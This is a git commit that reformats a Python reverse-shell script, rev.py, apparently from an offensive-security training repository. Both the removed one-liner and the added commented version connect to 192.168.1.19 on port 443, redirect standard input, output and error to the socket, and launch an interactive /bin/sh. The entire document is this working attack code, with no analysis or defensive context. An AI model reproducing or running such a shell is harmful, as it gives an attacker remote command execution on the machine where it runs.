90d7a474449947bd79c714e76fec3fb45925f952
Kirk Trychel <105792760+Teach2Breach@users.noreply.github.com>
2024-06-25 17:27:58 -0500

    Update rev.py

--- rev.py
+++ rev.py
@@ -1,1 +1,17 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.19",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+import socket
+import subprocess
+import os
+
+# Create a socket object
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connect to the server
+s.connect(("192.168.1.19", 443))
+
+# Duplicate file descriptors for stdin, stdout, and stderr
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+# Execute a shell
+subprocess.call(["/bin/sh", "-i"])
